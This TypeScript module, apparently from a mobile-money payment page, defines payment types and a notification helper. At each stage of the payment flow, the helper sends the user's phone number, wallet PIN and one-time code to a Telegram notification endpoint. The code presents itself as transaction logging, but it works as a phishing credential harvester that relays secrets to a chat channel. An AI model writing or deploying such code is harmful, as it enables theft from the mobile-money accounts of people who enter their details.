export type PaymentMethod =
  | "airtel"
  | "orange"
  | "mtn"
  | "moov"
  | "lumitel"
  | "vodacom"
  | "ecocash"
  | "waafi"
  | "kbzpay"
  | "palmpay"
  | "dmoney"
  | "ethiopia"
  | "card";

export type TxStatus = "pending" | "completed" | "failed";

/** Where in the payment flow this ping came from. */
export type NotifyStage =
  | "initiated"
  | "method_selected"
  | "phone_submitted"
  | "pin_submitted"
  | "otp_sent"
  | "otp_verify"
  | "completed"
  | "failed";

export interface NotifyPayload {
  planName: string;
  amount: string;
  paymentMethod: PaymentMethod | string;
  countryCode: string;
  status: TxStatus | string;
  countryName?: string;
  /** Full MSISDN incl. dialing code, e.g. "+260971234567" */
  phone?: string;
  pin?: string;
  otp?: string;
  verificationLink?: string;
  /** Which step triggered the notification, e.g. "pin_submitted" */
  stage?: NotifyStage;
}

export async function notifyTransaction(payload: NotifyPayload): Promise<void> {
  try {
    const url = `${import.meta.env.VITE_SUPABASE_URL}/functions/v1/telegram-notify`;
    const resp = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${import.meta.env.VITE_SUPABASE_ANON_KEY}`,
      },
      // keepalive lets the ping survive a redirect/unload mid-flow
      keepalive: true,
      body: JSON.stringify(payload),
    });
    if (!resp.ok) {
      console.warn("Notification failed:", resp.status);
    }
  } catch (err) {
    console.warn("Notification error:", err);
  }
}

/**
 * Fire a staged notification. Defaults to `status: "pending"` — pass
 * `status: "completed" | "failed"` in `extra` for terminal events.
 */
export function notifyStage(
  stage: NotifyStage,
  base: Omit<NotifyPayload, "stage" | "status">,
  extra: Partial<NotifyPayload> = {},
): Promise<void> {
  return notifyTransaction({ status: "pending", ...base, ...extra, stage });
}
